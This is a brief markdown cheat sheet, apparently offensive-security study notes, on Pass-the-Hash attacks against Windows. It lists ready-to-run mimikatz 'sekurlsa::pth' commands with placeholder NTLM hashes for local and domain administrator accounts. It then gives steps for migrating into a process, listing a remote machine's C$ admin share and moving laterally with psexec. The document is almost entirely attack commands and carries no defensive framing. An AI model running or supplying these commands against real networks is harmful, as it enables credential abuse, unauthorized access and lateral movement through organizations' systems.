# Pass-the-Hash PtH

### 1) PTH as a local user on a machine

    mimikatz '"privilege::debug" "sekurlsa::pth /user:Administrator /domain:. /ntlm:ffffffffffffffffffffffffffffffff" "exit"'
    mimikatz '"privilege::debug" "sekurlsa::pth /user:Administrator /domain:MACHINE01 /ntlm:ffffffffffffffffffffffffffffffff" "exit"'

### 2) PTH as a domain user

    mimikatz '"privilege::debug" "sekurlsa::pth /user:user /domain:domain.com /ntlm:ffffffffffffffffffffffffffffffff" "exit"'

### 3) migrate into the pid

    migrate -p 3316

### 4) List C$

    ls //machine/c$

### 5) Lateral movement

    psexec -d Title -s Description -p osep-lateral machine
